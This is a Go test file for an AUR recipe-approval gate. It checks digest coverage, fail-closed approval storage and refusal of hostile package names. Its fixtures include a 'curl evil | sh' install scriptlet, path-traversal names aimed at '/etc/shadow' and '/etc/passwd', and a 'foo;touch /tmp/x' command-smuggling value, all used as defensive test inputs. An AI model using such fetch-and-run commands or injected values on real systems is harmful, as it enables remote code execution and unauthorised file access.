// internal/gate/approve_test.go
package gate

import (
	"encoding/json"
	"errors"
	"go/parser"
	"go/token"
	"io/fs"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"

	"github.com/lookatitude/aurvet/internal/config"
)

// --- structural: this package never runs anything --------------------------

// TestPackageImportsNoExec mirrors internal/vcs's guard. The gate reads
// attacker-controlled recipes and attacker-controlled git repositories; the
// moment it can exec, INV-2 is a comment rather than a property.
func TestPackageImportsNoExec(t *testing.T) {
	banned := map[string]string{
		"os/exec": "runs a binary",
	}
	fset := token.NewFileSet()
	pkgs, err := parser.ParseDir(fset, ".", nil, parser.ImportsOnly)
	if err != nil {
		t.Fatalf("parse package: %v", err)
	}
	seen := 0
	for _, pkg := range pkgs {
		for name, file := range pkg.Files {
			if strings.HasSuffix(name, "_test.go") {
				continue
			}
			seen++
			for _, imp := range file.Imports {
				p := strings.Trim(imp.Path.Value, `"`)
				if why, bad := banned[p]; bad {
					t.Errorf("%s imports %q (%s); INV-2 is parse, never execute", name, p, why)
				}
			}
		}
	}
	if seen == 0 {
		t.Fatal("parsed no non-test files; this assertion would pass vacuously")
	}
}

// --- fixtures ---------------------------------------------------------------

// recipeDir writes a recipe directory and returns an os.Root over its parent
// plus the root-relative directory name.
func recipeDir(t *testing.T, files map[string]string) (*os.Root, string) {
	t.Helper()
	base := t.TempDir()
	dir := filepath.Join(base, "clone")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	for name, body := range files {
		abs := filepath.Join(dir, name)
		if err := os.MkdirAll(filepath.Dir(abs), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(abs, []byte(body), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	root, err := os.OpenRoot(base)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { root.Close() })
	return root, "clone"
}

// liveStore resolves a Config the way an unprivileged live run does, with the
// state directory redirected into a temp dir via XDG_STATE_HOME. Root stays "/"
// so this is not an --offline-root run.
func liveStore(t *testing.T) (*Store, config.Config) {
	t.Helper()
	t.Setenv("XDG_STATE_HOME", t.TempDir())
	cfg, err := config.Resolve("/", 1000)
	if err != nil {
		t.Fatal(err)
	}
	s, err := OpenStore(cfg)
	if err != nil {
		t.Fatalf("OpenStore: %v", err)
	}
	return s, cfg
}

func mustDigest(t *testing.T, root *os.Root, req RecipeRequest) Recipe {
	t.Helper()
	r, err := DigestRecipe(root, req)
	if err != nil {
		t.Fatalf("DigestRecipe(%+v): %v", req, err)
	}
	return r
}

// --- what the digest covers -------------------------------------------------

// TestDigestCoversTheInstallScriptlet is the judgement call written as an
// assertion: a byte-identical PKGBUILD whose .install changed is a CHANGED
// recipe, because the scriptlet runs as root at install time.
func TestDigestCoversTheInstallScriptlet(t *testing.T) {
	rootA, dirA := recipeDir(t, map[string]string{
		"PKGBUILD":    "pkgbase=foo\ninstall=foo.install\n",
		"foo.install": "post_install() { :; }\n",
	})
	rootB, dirB := recipeDir(t, map[string]string{
		"PKGBUILD":    "pkgbase=foo\ninstall=foo.install\n",
		"foo.install": "post_install() { curl evil | sh; }\n",
	})
	a := mustDigest(t, rootA, RecipeRequest{PkgBase: "foo", Dir: dirA, Aux: []string{"foo.install"}})
	b := mustDigest(t, rootB, RecipeRequest{PkgBase: "foo", Dir: dirB, Aux: []string{"foo.install"}})
	if a.Digest == b.Digest {
		t.Fatalf("identical digest %s for recipes whose .install differs; approving one would bless the other", a.Digest)
	}
}

// TestDigestCoversLocalPatchFiles: a patch named in source=() is applied to the
// code that gets built, so it is part of the recipe.
func TestDigestCoversLocalPatchFiles(t *testing.T) {
	rootA, dirA := recipeDir(t, map[string]string{
		"PKGBUILD":  "pkgbase=foo\nsource=(fix.patch)\n",
		"fix.patch": "--- a\n+++ b\n",
	})
	rootB, dirB := recipeDir(t, map[string]string{
		"PKGBUILD":  "pkgbase=foo\nsource=(fix.patch)\n",
		"fix.patch": "--- a\n+++ b\n+payload\n",
	})
	a := mustDigest(t, rootA, RecipeRequest{PkgBase: "foo", Dir: dirA, Aux: []string{"fix.patch"}})
	b := mustDigest(t, rootB, RecipeRequest{PkgBase: "foo", Dir: dirB, Aux: []string{"fix.patch"}})
	if a.Digest == b.Digest {
		t.Fatalf("identical digest %s for recipes whose local patch differs", a.Digest)
	}
}

// TestDigestIgnoresAuxOrderAndDuplicates: the digest is a property of the file
// SET, not of the order a caller happened to resolve sources in. Otherwise an
// approval would go stale because the resolver reordered its output.
func TestDigestIgnoresAuxOrderAndDuplicates(t *testing.T) {
	root, dir := recipeDir(t, map[string]string{
		"PKGBUILD":    "pkgbase=foo\n",
		"foo.install": "x\n",
		"fix.patch":   "y\n",
	})
	a := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir, Aux: []string{"foo.install", "fix.patch"}})
	b := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir, Aux: []string{"fix.patch", "foo.install", "fix.patch"}})
	if a.Digest != b.Digest {
		t.Fatalf("digest depends on aux ordering: %s != %s", a.Digest, b.Digest)
	}
	if len(a.Files) != 3 {
		t.Fatalf("Files = %+v, want PKGBUILD plus two aux entries", a.Files)
	}
}

// TestDigestDependsOnFileNamesNotOnlyContent: swapping two files' contents
// between names must change the digest, or the manifest encoding is not
// injective.
func TestDigestDependsOnFileNames(t *testing.T) {
	rootA, dirA := recipeDir(t, map[string]string{
		"PKGBUILD": "pkgbase=foo\n", "a.install": "1\n", "b.patch": "2\n",
	})
	rootB, dirB := recipeDir(t, map[string]string{
		"PKGBUILD": "pkgbase=foo\n", "a.install": "2\n", "b.patch": "1\n",
	})
	a := mustDigest(t, rootA, RecipeRequest{PkgBase: "foo", Dir: dirA, Aux: []string{"a.install", "b.patch"}})
	b := mustDigest(t, rootB, RecipeRequest{PkgBase: "foo", Dir: dirB, Aux: []string{"a.install", "b.patch"}})
	if a.Digest == b.Digest {
		t.Fatal("digest is insensitive to which file holds which content")
	}
}

// TestDigestExcludesUnnamedFiles: an approval must not go stale because a build
// left a .pkg.tar.zst or a src/ tree in the clone. Only files the recipe names
// are covered -- and that scope limit is what Recipe.Files reports.
func TestDigestExcludesUnnamedFiles(t *testing.T) {
	root, dir := recipeDir(t, map[string]string{
		"PKGBUILD": "pkgbase=foo\n", "junk.log": "build output\n",
	})
	a := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if err := os.WriteFile(filepath.Join(root.Name(), dir, "junk.log"), []byte("different\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	b := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if a.Digest != b.Digest {
		t.Fatalf("unnamed file changed the digest: %s != %s", a.Digest, b.Digest)
	}
}

// TestDigestRefusesMissingPKGBUILD: no recipe, no digest, no approval. A
// digest over an absent file would approve nothing while looking approved.
func TestDigestRefusesMissingPKGBUILD(t *testing.T) {
	root, dir := recipeDir(t, map[string]string{"foo.install": "x\n"})
	if _, err := DigestRecipe(root, RecipeRequest{PkgBase: "foo", Dir: dir}); !errors.Is(err, ErrRecipeUnreadable) {
		t.Fatalf("err = %v, want ErrRecipeUnreadable", err)
	}
}

// TestDigestRefusesUnreadableAuxFile: a named file this tool could not read is
// a hole in the digest, so the digest is refused rather than computed over the
// half it could see.
func TestDigestRefusesUnreadableAuxFile(t *testing.T) {
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	_, err := DigestRecipe(root, RecipeRequest{PkgBase: "foo", Dir: dir, Aux: []string{"missing.install"}})
	if !errors.Is(err, ErrRecipeUnreadable) {
		t.Fatalf("err = %v, want ErrRecipeUnreadable", err)
	}
	if !strings.Contains(err.Error(), "missing.install") {
		t.Errorf("error does not name the file: %v", err)
	}
}

// TestDigestRefusesEscapingAuxName: source=(../../etc/shadow) must not make the
// gate read outside the clone.
func TestDigestRefusesEscapingAuxName(t *testing.T) {
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	for _, name := range []string{"../PKGBUILD", "/etc/shadow", "sub/../../PKGBUILD", "a\x00b"} {
		if _, err := DigestRecipe(root, RecipeRequest{PkgBase: "foo", Dir: dir, Aux: []string{name}}); err == nil {
			t.Errorf("aux %q accepted", name)
		}
	}
}

// TestDigestRefusesSymlinkedRecipeFile: a PKGBUILD that is a symlink is not a
// file whose bytes this tool will vouch for.
func TestDigestRefusesSymlinkedRecipeFile(t *testing.T) {
	root, dir := recipeDir(t, map[string]string{"real": "pkgbase=foo\n"})
	if err := os.Symlink("real", filepath.Join(root.Name(), dir, "PKGBUILD")); err != nil {
		t.Fatal(err)
	}
	if _, err := DigestRecipe(root, RecipeRequest{PkgBase: "foo", Dir: dir}); err == nil {
		t.Fatal("symlinked PKGBUILD accepted")
	}
}

// --- the store: silent when unchanged, re-prompts on change -----------------

func TestApprovedRecipeIsSilent(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})

	if d := s.Lookup(r.PkgBase, r.Digest); d.Status != StatusUnknown {
		t.Fatalf("before approval Status = %q, want %q", d.Status, StatusUnknown)
	} else if len(d.Gaps) != 0 {
		t.Fatalf("a never-approved package is not a coverage gap: %+v", d.Gaps)
	}

	if _, err := s.Approve(r, ApproveOptions{By: "operator", Note: "reviewed"}); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	d := s.Lookup(r.PkgBase, r.Digest)
	if d.Status != StatusApproved || !d.Silent() {
		t.Fatalf("after approval Status = %q silent = %v, want approved and silent", d.Status, d.Silent())
	}
	if len(d.Gaps) != 0 {
		t.Fatalf("approved lookup produced gaps: %+v", d.Gaps)
	}
}

// TestOneChangedByteReprompts proves the digest half of the key is
// load-bearing.
func TestOneChangedByteReprompts(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\nsource=(a)\n"})
	before := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(before, ApproveOptions{}); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	if err := os.WriteFile(filepath.Join(root.Name(), dir, "PKGBUILD"), []byte("pkgbase=foo\nsource=(b)\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	after := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if after.Digest == before.Digest {
		t.Fatal("digest unchanged after editing the PKGBUILD")
	}
	d := s.Lookup(after.PkgBase, after.Digest)
	if d.Status != StatusChanged {
		t.Fatalf("Status = %q, want %q", d.Status, StatusChanged)
	}
	if d.Silent() {
		t.Fatal("a changed recipe was silent")
	}
	if d.Prior == nil || d.Prior.Digest != before.Digest {
		t.Fatalf("Prior = %+v, want the superseded approval so review can diff against it", d.Prior)
	}
}

// TestApprovalDoesNotCrossPkgbase proves the pkgbase half of the key is
// load-bearing: two packages with a byte-identical recipe are two decisions.
func TestApprovalDoesNotCrossPkgbase(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=shared\n"})
	foo := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	bar := mustDigest(t, root, RecipeRequest{PkgBase: "bar", Dir: dir})
	if foo.Digest != bar.Digest {
		t.Fatalf("precondition failed: the two recipes must be byte-identical (%s vs %s)", foo.Digest, bar.Digest)
	}
	if _, err := s.Approve(foo, ApproveOptions{}); err != nil {
		t.Fatalf("Approve: %v", err)
	}
	d := s.Lookup(bar.PkgBase, bar.Digest)
	if d.Status == StatusApproved || d.Silent() {
		t.Fatalf("approving %q silenced %q (Status=%q)", foo.PkgBase, bar.PkgBase, d.Status)
	}
	// And it must be a clean "never approved", not a store error: the two
	// packages occupy different slots, so bar's lookup must not even see foo's
	// record. Accepting an error here would let a store that keys on the digest
	// alone pass by tripping over its own record.
	if d.Status != StatusUnknown || len(d.Gaps) != 0 {
		t.Fatalf("Status = %q gaps = %+v, want %q with no gaps: the two pkgbases must not share a record slot",
			d.Status, d.Gaps, StatusUnknown)
	}
}

// TestReApprovalReplacesTheRecord: approving the new recipe must not leave the
// old digest approved, or a downgrade to a previously-approved recipe is silent.
func TestReApprovalRevokesTheOldDigest(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "v1\n"})
	v1 := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(v1, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(root.Name(), dir, "PKGBUILD"), []byte("v2\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	v2 := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(v2, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	if d := s.Lookup("foo", v1.Digest); d.Status == StatusApproved {
		t.Fatal("the superseded recipe is still approved; a rollback would be silent")
	}
}

// --- a corrupt store fails closed, loudly -----------------------------------

// TestCorruptRecordIsAGapNotAnAnswer: an attacker who can corrupt the store
// must not thereby buy silence, and must not buy a clean "nothing approved"
// either -- the tool says it could not determine approval.
func TestCorruptRecordIsAGapNotAnAnswer(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	path := s.recordPath(r.PkgBase)
	if err := os.WriteFile(path, []byte(`{"pkgbase":"foo","dig`), 0o600); err != nil {
		t.Fatal(err)
	}
	d := s.Lookup(r.PkgBase, r.Digest)
	if d.Status != StatusIndeterminate {
		t.Fatalf("Status = %q, want %q", d.Status, StatusIndeterminate)
	}
	if d.Silent() {
		t.Fatal("a corrupt store was silent")
	}
	if len(d.Gaps) == 0 {
		t.Fatal("a corrupt store produced no coverage gap")
	}
	if d.Gaps[0].RuleID != RuleRecordCorrupt || d.Gaps[0].Subject != "foo" {
		t.Fatalf("gap = %+v, want %s on the pkgbase", d.Gaps[0], RuleRecordCorrupt)
	}
}

// TestRecordForAnotherPkgbaseIsRefused: a record whose contents name a
// different pkgbase than the slot it sits in has been tampered with.
func TestRecordNamingAnotherPkgbaseIsRefused(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	var a Approval
	raw, err := os.ReadFile(s.recordPath("foo"))
	if err != nil {
		t.Fatal(err)
	}
	if err := json.Unmarshal(raw, &a); err != nil {
		t.Fatalf("the record format must be plain stdlib JSON: %v", err)
	}
	a.PkgBase = "somethingelse"
	edited, err := json.Marshal(a)
	if err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(s.recordPath("foo"), edited, 0o600); err != nil {
		t.Fatal(err)
	}
	d := s.Lookup("foo", r.Digest)
	if d.Status != StatusIndeterminate || len(d.Gaps) == 0 {
		t.Fatalf("Status = %q gaps = %+v, want indeterminate with a gap", d.Status, d.Gaps)
	}
}

// TestUnreadableStoreIsAGap: EACCES on the store directory is a coverage gap on
// every lookup, not "nothing is approved".
func TestUnreadableStoreIsAGap(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root: mode bits do not deny root")
	}
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(s.Dir(), 0o000); err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() { os.Chmod(s.Dir(), 0o700) })

	d := s.Lookup(r.PkgBase, r.Digest)
	if d.Status != StatusIndeterminate || d.Silent() {
		t.Fatalf("Status = %q silent = %v, want indeterminate and not silent", d.Status, d.Silent())
	}
	if len(d.Gaps) == 0 {
		t.Fatal("an unreadable store produced no coverage gap")
	}
}

// TestGroupWritableStoreIsRefused: an approval store any other account can
// write is an approval store the thing being approved can forge.
func TestGroupWritableStoreIsRefused(t *testing.T) {
	if os.Geteuid() == 0 {
		t.Skip("running as root")
	}
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	if err := os.Chmod(s.Dir(), 0o770); err != nil {
		t.Fatal(err)
	}
	d := s.Lookup(r.PkgBase, r.Digest)
	if d.Status == StatusApproved || d.Silent() {
		t.Fatalf("a group-writable store still reported %q", d.Status)
	}
	if len(d.Gaps) == 0 || d.Gaps[0].RuleID != RuleStoreUnsafe {
		t.Fatalf("gaps = %+v, want %s", d.Gaps, RuleStoreUnsafe)
	}
	if _, err := s.Approve(r, ApproveOptions{}); !errors.Is(err, ErrStoreUnsafe) {
		t.Fatalf("Approve into a group-writable store: err = %v, want ErrStoreUnsafe", err)
	}
}

// TestSymlinkedRecordIsRefused: the record slot must not be usable to make the
// gate read (or later write) somewhere else.
func TestSymlinkedRecordIsRefused(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	path := s.recordPath("foo")
	elsewhere := filepath.Join(t.TempDir(), "planted.json")
	if err := os.Rename(path, elsewhere); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink(elsewhere, path); err != nil {
		t.Fatal(err)
	}
	d := s.Lookup("foo", r.Digest)
	if d.Status == StatusApproved || d.Silent() {
		t.Fatalf("a symlinked record was honoured: %q", d.Status)
	}
	if len(d.Gaps) == 0 {
		t.Fatal("a symlinked record produced no coverage gap")
	}
}

// --- hostile pkgbase --------------------------------------------------------

// TestHostilePkgbaseIsRefused: the pkgbase comes from an attacker-controlled
// .SRCINFO. It is refused before it can reach a path, and refusal is reported
// rather than swallowed.
func TestHostilePkgbaseIsRefused(t *testing.T) {
	s, _ := liveStore(t)
	names := map[string]string{
		"traversal":       "../../etc/aurvet",
		"traversal-plain": "..",
		"dot":             ".",
		"absolute":        "/etc/passwd",
		"nul":             "foo\x00bar",
		"newline":         "foo\nbar",
		"slash":           "foo/bar",
		"empty":           "",
		"leading-dash":    "-rf",
		"leading-dot":     ".hidden",
		"space":           "foo bar",
		"shell":           "foo;touch /tmp/x",
		"long":            strings.Repeat("a", 4096),
		"nonascii":        "föö",
	}
	for label, name := range names {
		t.Run(label, func(t *testing.T) {
			d := s.Lookup(name, "0000")
			if d.Status != StatusIndeterminate || d.Silent() {
				t.Fatalf("Lookup(%q) Status = %q, want indeterminate", name, d.Status)
			}
			if len(d.Gaps) == 0 || d.Gaps[0].RuleID != RulePkgBaseRefused {
				t.Fatalf("gaps = %+v, want %s", d.Gaps, RulePkgBaseRefused)
			}
			root, dir := recipeDir(t, map[string]string{"PKGBUILD": "x\n"})
			r, err := DigestRecipe(root, RecipeRequest{PkgBase: name, Dir: dir})
			if err == nil {
				if _, err := s.Approve(r, ApproveOptions{}); !errors.Is(err, ErrBadPkgBase) {
					t.Fatalf("Approve(%q): err = %v, want ErrBadPkgBase", name, err)
				}
			} else if !errors.Is(err, ErrBadPkgBase) {
				t.Fatalf("DigestRecipe(%q): err = %v, want ErrBadPkgBase", name, err)
			}
		})
	}
	// Nothing may have been created anywhere but inside the store directory,
	// and the store must hold no record at all.
	ents, err := os.ReadDir(s.Dir())
	if err != nil && !errors.Is(err, fs.ErrNotExist) {
		t.Fatal(err)
	}
	if len(ents) != 0 {
		t.Fatalf("refused names left %d entries in the store: %v", len(ents), ents)
	}
}

// TestRealPkgbaseNamesAreAccepted guards the refusal above from being so strict
// that it refuses the ecosystem. These are shapes that exist on the AUR.
func TestRealPkgbaseNamesAreAccepted(t *testing.T) {
	s, _ := liveStore(t)
	for _, name := range []string{
		"yay", "paru-bin", "librewolf-fix-bin", "python-tree-sitter-git",
		"lib32-gcc-libs", "ttf-ms-fonts", "gtk2+extra", "foo.bar", "a", "zoom_1.0",
	} {
		d := s.Lookup(name, "0000")
		if d.Status != StatusUnknown {
			t.Errorf("Lookup(%q) Status = %q, want %q (refusing a real pkgbase breaks the gate)", name, d.Status, StatusUnknown)
		}
	}
}

// TestRecordPathIsNotAttackerText: even for accepted names, the on-disk slot is
// derived by hashing rather than by pasting the name into a path.
func TestRecordPathIsNotAttackerText(t *testing.T) {
	s, _ := liveStore(t)
	p := filepath.Base(s.recordPath("librewolf-fix-bin"))
	if strings.Contains(p, "librewolf") {
		t.Fatalf("record slot %q embeds the pkgbase verbatim", p)
	}
	if !strings.HasSuffix(p, ".json") || len(p) != 64+len(".json") {
		t.Fatalf("record slot %q is not a sha256 hex name", p)
	}
}

// --- INV-5 ------------------------------------------------------------------

// TestApproveRefusesUnderOfflineRoot: --offline-root resolves StateDir INSIDE
// the tree being inspected, so writing an approval there would mutate the
// evidence. Reads still work.
func TestApproveRefusesUnderOfflineRoot(t *testing.T) {
	target := t.TempDir()
	cfg, err := config.Resolve(target, 1000)
	if err != nil {
		t.Fatal(err)
	}
	s, err := OpenStore(cfg)
	if err != nil {
		t.Fatalf("OpenStore: %v", err)
	}
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); !errors.Is(err, ErrOffline) {
		t.Fatalf("Approve under --offline-root: err = %v, want ErrOffline", err)
	}
	// Nothing at all may have appeared under the target.
	var created []string
	filepath.WalkDir(target, func(p string, d fs.DirEntry, err error) error {
		if err == nil && p != target {
			created = append(created, p)
		}
		return nil
	})
	if len(created) != 0 {
		t.Fatalf("INV-5 violated: %v", created)
	}
	if d := s.Lookup("foo", r.Digest); d.Status != StatusUnknown {
		t.Fatalf("read under --offline-root Status = %q, want %q", d.Status, StatusUnknown)
	}
}

// TestLookupCreatesNothing: a read must not bring the store into existence.
func TestLookupCreatesNothing(t *testing.T) {
	s, _ := liveStore(t)
	if d := s.Lookup("foo", "abcd"); d.Status != StatusUnknown {
		t.Fatalf("Status = %q", d.Status)
	}
	if _, err := os.Lstat(s.Dir()); !errors.Is(err, fs.ErrNotExist) {
		t.Fatalf("Lookup created %s (err=%v)", s.Dir(), err)
	}
}

// --- record hygiene ---------------------------------------------------------

func TestApproveWritesPrivateModes(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	di, err := os.Stat(s.Dir())
	if err != nil {
		t.Fatal(err)
	}
	if di.Mode().Perm() != 0o700 {
		t.Errorf("store dir mode = %o, want 700", di.Mode().Perm())
	}
	fi, err := os.Stat(s.recordPath("foo"))
	if err != nil {
		t.Fatal(err)
	}
	if fi.Mode().Perm() != 0o600 {
		t.Errorf("record mode = %o, want 600", fi.Mode().Perm())
	}
	// No temp file may survive an approval.
	ents, err := os.ReadDir(s.Dir())
	if err != nil {
		t.Fatal(err)
	}
	if len(ents) != 1 {
		t.Fatalf("store holds %d entries after one approval: %v", len(ents), ents)
	}
}

// TestApprovalRecordCarriesItsEvidence: the record must say what was approved,
// when, and over which files -- an approval nobody can audit is not a record of
// a human decision.
func TestApprovalRecordCarriesItsEvidence(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{
		"PKGBUILD": "pkgbase=foo\n", "foo.install": "x\n",
	})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir, Aux: []string{"foo.install"}})
	when := time.Date(2026, 8, 5, 10, 0, 0, 0, time.UTC)
	got, err := s.Approve(r, ApproveOptions{By: "miguel", Note: "read the diff", Now: when,
		VCS: &Anchor{Commit: strings.Repeat("a", 40), Remote: "https://aur.archlinux.org/foo.git"}})
	if err != nil {
		t.Fatal(err)
	}
	if got.FormatVersion != StoreFormat {
		t.Errorf("FormatVersion = %d, want %d", got.FormatVersion, StoreFormat)
	}
	if !got.ApprovedAt.Equal(when) {
		t.Errorf("ApprovedAt = %v, want %v", got.ApprovedAt, when)
	}
	d := s.Lookup("foo", r.Digest)
	if d.Status != StatusApproved {
		t.Fatalf("Status = %q", d.Status)
	}
	a := d.Approval
	if a == nil {
		t.Fatal("approved decision carries no Approval")
	}
	if a.By != "miguel" || a.Note != "read the diff" {
		t.Errorf("By/Note = %q/%q", a.By, a.Note)
	}
	if len(a.Files) != 2 || a.Files[0].Name != "PKGBUILD" {
		t.Errorf("Files = %+v, want PKGBUILD first then the scriptlet", a.Files)
	}
	if a.VCS == nil || a.VCS.Commit != strings.Repeat("a", 40) {
		t.Errorf("VCS anchor = %+v; the -git delta review needs it", a.VCS)
	}
}

// TestUnknownFormatVersionIsIndeterminate: a record written by a future version
// must not be read as approval by an older one.
func TestUnknownFormatVersionIsIndeterminate(t *testing.T) {
	s, _ := liveStore(t)
	root, dir := recipeDir(t, map[string]string{"PKGBUILD": "pkgbase=foo\n"})
	r := mustDigest(t, root, RecipeRequest{PkgBase: "foo", Dir: dir})
	if _, err := s.Approve(r, ApproveOptions{}); err != nil {
		t.Fatal(err)
	}
	raw, err := os.ReadFile(s.recordPath("foo"))
	if err != nil {
		t.Fatal(err)
	}
	var a Approval
	if err := json.Unmarshal(raw, &a); err != nil {
		t.Fatal(err)
	}
	a.FormatVersion = StoreFormat + 99
	edited, _ := json.Marshal(a)
	if err := os.WriteFile(s.recordPath("foo"), edited, 0o600); err != nil {
		t.Fatal(err)
	}
	d := s.Lookup("foo", r.Digest)
	if d.Status != StatusIndeterminate || len(d.Gaps) == 0 {
		t.Fatalf("Status = %q gaps = %+v", d.Status, d.Gaps)
	}
}

// TestDecisionLimitsAreStated is INV-6 at the decision level: every non-approved
// outcome says what it could not establish.
func TestDecisionLimitsAreStated(t *testing.T) {
	s, _ := liveStore(t)
	for _, d := range []Decision{
		s.Lookup("foo", "deadbeef"),
		s.Lookup("../evil", "deadbeef"),
	} {
		if d.Limits == "" {
			t.Errorf("Decision %+v states no limits", d)
		}
	}
}
